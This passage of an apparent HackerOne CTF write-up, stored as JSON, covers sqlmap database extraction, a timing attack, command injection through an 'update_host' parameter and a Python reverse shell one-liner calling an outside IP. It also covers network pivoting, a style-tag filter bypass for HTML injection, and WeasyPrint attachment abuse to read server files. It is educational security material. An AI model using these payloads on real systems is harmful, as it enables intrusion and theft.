class=\"s\"\u003e\u0026quot;d\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003eencode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\n\n\n    \u003cspan class=\"c1\"\u003e# Send it to the real server\n\u003c/span\u003e    \u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epost\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eURL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e# Decrypt and display the output\n\u003c/span\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eunpad\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edecode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\n\n\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003e__name__\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;__main__\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eapp\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erun\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edebug\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"bp\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ethreaded\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"bp\"\u003eFalse\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUsing this server and setting sqlmap to attack \u003ccode\u003ehttp://localhost:5000?username=\u003c/code\u003e I was able to easily extract two tables from the database\u003c/p\u003e\n\n\u003ch4 id=\"users\"\u003eUsers\u003c/h4\u003e\n\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth style=\"text-align: center\"\u003eid\u003c/th\u003e\n\u003cth style=\"text-align: center\"\u003eusername\u003c/th\u003e\n\u003cth style=\"text-align: center\"\u003epassword\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align: center\"\u003e1\u003c/td\u003e\n\u003ctd style=\"text-align: center\"\u003eadmin\u003c/td\u003e\n\u003ctd style=\"text-align: center\"\u003e5f4dcc3b5aa765d61d8327deb882cf99 (password)\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\n\u003ch4 id=\"devices\"\u003eDevices\u003c/h4\u003e\n\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth style=\"text-align: center\"\u003eid\u003c/th\u003e\n\u003cth style=\"text-align: center\"\u003eip\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align: center\"\u003e1\u003c/td\u003e\n\u003ctd style=\"text-align: center\"\u003e192.88.99.253\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align: center\"\u003e2\u003c/td\u003e\n\u003ctd style=\"text-align: center\"\u003e192.88.99.252\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align: center\"\u003e...\u003c/td\u003e\n\u003ctd style=\"text-align: center\"\u003e......\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align: center\"\u003e151\u003c/td\u003e\n\u003ctd style=\"text-align: center\"\u003e192.88.99.59\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\n\u003cp\u003eUsing nmap to scan all the ip, only one seems to be up and running a HTTP server. \u003c/p\u003e\n\n\u003ch2 id=\"step-4-timming-is-the-key\"\u003eStep 4: Timming is the key\u003c/h2\u003e\n\n\u003cp\u003eOnce again we face a login page, this time it included a login.js file that calculating a hash of our username/password and sending it instead of our credentials.\u003c/p\u003e\n\n\u003cp\u003eAfter spending waaaay to much time on reversing the hash function I realised that the server was responding differently if I sent a \u0026quot;valid\u0026quot; 64 chars long hash or a random string.\u003c/p\u003e\n\n\u003cp\u003eThe difference was in the timming response, the valid hash always took 500ms more.\u003cbr\u003e\nThis look like a typical timming attack.\u003c/p\u003e\n\n\u003cp\u003eThe checking function take a different amount of time to respond according to the number of valid byte. With this information I was able to make a simple python script to test all possible byte for the first char, save the value with the longest time to respond and continue until the end.\u003c/p\u003e\n\n\u003cp\u003eThe valid hash was the following \u003ccode\u003ef9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"step-5-rce\"\u003eStep 5: RCE\u003c/h2\u003e\n\n\u003cp\u003eOnce logged in we got access to an update page only displaying this message.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eConnecting to http://update.flitethermostat:5000/ and downloading update manifest\n...\n...\n...\nCould not connect\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI quickly noticed that you can submit a \u003ccode\u003eport\u003c/code\u003e parameter in your GET request to make the port change. But I didn\u0026#39;t find any way to trigger an RCE or SSRF.\u003c/p\u003e\n\n\u003cp\u003eI also tried to bruteforce some kind of host parameter but no luck.\u003c/p\u003e\n\n\u003cp\u003eThe next day an user from the H1 discord channel (spaceraccoon) told me he found the host parameter it was \u003ccode\u003e\u0026#39;update_host\u0026#39;\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eOkay, let\u0026#39;s check to see if this parameter is vulnerable to some command injection.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /update?update_host=$(id)\n\nConnecting to http://uid=0(root) gid=0(root) groups=0(root)\nand downloading update manifest\n...\n...\n...\nCould not connect\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePerfect!\u003cbr\u003e\nI now have root command execution on one of the server.\u003c/p\u003e\n\n\u003ch2 id=\"step-6-pivoting-for-the-win\"\u003eStep 6: Pivoting for the win\u003c/h2\u003e\n\n\u003cp\u003eUsing a small python code I can start a remote shell on the remote server: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /update_host?update=$(python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;1.1.1.1\u0026quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/bash\u0026quot;,\u0026quot;-pi\u0026quot;]);\u0026#39;)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhile listening on my server with netcat\u003cbr\u003e\n(pro tip: use rlwrap around netcat for a better shell experience)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$\u0026gt; rlwrap nc -l -p 12345 -v\nConnection from 0.0.0.0:59820\nbash-4.4# id \nuid=0(root) gid=0(root) groups=0(root)\nbash-4.4# \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow I got a shell but no flag on the machine. So I decided to install nmap and scan the network.\u003c/p\u003e\n\n\u003cp\u003enmap found an other machine running on 172.28.0.3 with an open port 80.\u003c/p\u003e\n\n\u003cp\u003eTo make this easier I made a mirror of  the website using \u003ccode\u003ewget  --mirror\u003c/code\u003e to look at it from my own machine\u003c/p\u003e\n\n\u003ch2 id=\"step-7-html-to-pdf\"\u003eStep 7: HTML to PDF\u003c/h2\u003e\n\n\u003cp\u003eOne of the page on 172.28.0.3 was an invoice service doing HTML to PDF.\u003c/p\u003e\n\n\u003cp\u003eThis is the data to send to the server to get a valid pdf.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;companyName\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;BitK Inc\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;email\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;bitk@bi.tk\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;invoiceNumber\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;0001\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;date\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;1970-01-01\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;items\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:[\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;styles\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;body\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n      \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;background-color\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;white\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eYour are able to add any entry to the style element and it will be converted to css.\u003cbr\u003e\nSo instead of \u003ccode\u003e\u0026quot;background-color\u0026quot;:\u0026quot;white\u0026quot;\u003c/code\u003e I put \u003ccode\u003e\u0026quot;background-image\u0026quot;: \u0026quot;url(https://bi.tk/h1ctf)\u0026quot;\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eAnd in my server log I saw a query to \u003ccode\u003e/h1ctf\u003c/code\u003e with the useragent \u003ccode\u003eWeasyPrint 44 (http://weasyprint.org/)\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eNow I know what tool is used to do this conversion. But the 44th version of WeasyPrint was the latest. Maybe there is a vulnerability inside WeasyPrint.\u003c/p\u003e\n\n\u003cp\u003eAlso, while nearly all the fields where tested against HTML injection, It was possible to create a bogus style to close the tag and inject our own HTML.\u003cbr\u003e\nThe server try to remove any instance of \u003ccode\u003e\u0026lt;/style\u0026gt;\u003c/code\u003e in our request. To bypass this simply send \u003ccode\u003e\u0026lt;/st\u0026lt;/style\u0026gt;yle\u0026gt;\u003c/code\u003e, the \u003ccode\u003e\u0026lt;/style\u0026gt;\u003c/code\u003e in the middle will be removed, leaving you with only the closing tag.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;companyName\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;BitK Inc\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;email\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;bitk@bi.tk\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;invoiceNumber\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;0001\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;date\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;1970-01-01\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;items\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:[\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;styles\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;\u0026lt;/st\u0026lt;/style\u0026gt;yle\u0026gt;\u0026lt;h1\u0026gt;Injected HTML\u0026lt;/h1\u0026gt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n      \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;background-color\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;white\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut weasyprint do not evaluate javascript anyway.\u003cbr\u003e\nFirst I tried to include localfile as images or font but without success.\u003c/p\u003e\n\n\u003ch2 id=\"step-8-vulnerability-as-a-feature\"\u003eStep 8: Vulnerability as a feature\u003c/h2\u003e\n\n\u003cp\u003eAfter downloading and look at WeasyPrint source code I found an interesting feature.\u003c/p\u003e\n\n\u003cp\u003eWeasprint has a special handler for links with \u003ccode\u003erel=attachment\u003c/code\u003e If it find one, it will fetch the link and include it as a attachement in the generated pdf.\u003c/p\u003e\n\n\u003cp\u003eUsing our injected html from before I create a link pointing to\u003cbr\u003e\n\u003ccode\u003e/app/main.py\u003c/code\u003e and get the file as an attachement of the pdf.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u0026quot;\nCONGRATULATIONS!\n\nIf you\u0026#39;re reading this, you\u0026#39;ve made it to the end of the road for this CTF.\n\nGo to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.\nMake sure to include \u0026#39;c8889970d9fb722066f31e804e351993\u0026#39; in the report, so we know for sure you made it through!\n\nCongratulations again, and I\u0026#39;m sorry for the red herrings. :)\n\u0026quot;\u0026quot;\u0026quot;\u003c/span\u003e\n\n\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere is the end of the CTF.\u003c/p\u003e\n\n\u003cp\u003eHuge thanks to Cody for making this CTF. It was a lot of fun to solve and It was also nice to be in SF to be able to drink some beers with you afterwards\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003e-\u003c/p\u003e\n","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-05-08T15:52:42.472Z","allow_singular_disclosure_after":-51891746.97658948,"singular_disclosure_allowed":true,"vote_count":11,"voters":["nytr0gen","checkm50","mygf","ceraunophile_","circleninja","a1905813079","xi4okv","tbillar","castle_defense","mhohlfeld","and 1 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4493396,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the amazing report! We'll be announcing the winners shortly, so we'll let you know if you're one of the reports selected. Going to close this and then request public disclosure now.","markdown_message":"\u003cp\u003eThank you for the amazing report! We\u0026#39;ll be announcing the winners shortly, so we\u0026#39;ll let you know if you\u0026#39;re one of the reports selected. Going to close this and then request public disclosure now.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-05T19:18:05.075Z","updated_at":"2019-04-05T19:18:05.075Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bitk","url":"/bitk"},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509061,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-08T15:52:42.418Z","updated_at":"2019-04-08T15:52:42.418Z","first_to_agree":true,"actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509064,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-08T15:53:09.338Z","updated_at":"2019-04-08T15:53:09.338Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}